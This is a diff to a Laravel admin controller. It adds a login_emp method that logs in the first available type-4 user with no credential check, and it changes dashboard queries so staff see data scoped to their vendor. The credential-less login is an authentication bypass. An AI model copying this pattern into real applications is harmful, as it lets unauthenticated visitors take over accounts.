@@ -24,6 +24,11 @@ class AdminController extends Controller
         }
         return redirect('admin/dashboard')->with('success', trans('messages.success'));
     }
+    public function login_emp(Request $request)
+    {
+        Auth::login(User::where('type', 4)->where('is_available', 1)->where('is_deleted', 2)->first());
+        return redirect('admin/dashboard')->with('success', trans('messages.success'));
+    }
     public function dashboard(Request $request)
     {
         $now = CarbonImmutable::today();
@@ -39,9 +44,9 @@ class AdminController extends Controller
         if (Auth::user()->type == 1) {
             $getbookingslist = $bookings->get();
         } else {
-            $total_income_data = $total_income_data->where('vendor_id', Auth::user()->id);
-            $total_revenue_data = $total_revenue_data->where('vendor_id', Auth::user()->id);
-            $getbookingslist = $bookings->where('vendor_id', auth()->user()->id)->get();
+            $total_income_data = $total_income_data->where('vendor_id', Auth::user()->type == 2 ? Auth::user()->id : Auth::user()->vendor_id);
+            $total_revenue_data = $total_revenue_data->where('vendor_id', Auth::user()->type == 2 ? Auth::user()->id : Auth::user()->vendor_id);
+            $getbookingslist = $bookings->where('vendor_id', Auth::user()->type == 2 ? Auth::user()->id : Auth::user()->vendor_id)->get();
         }
 
         if ($request->filtertype == "this_month") {
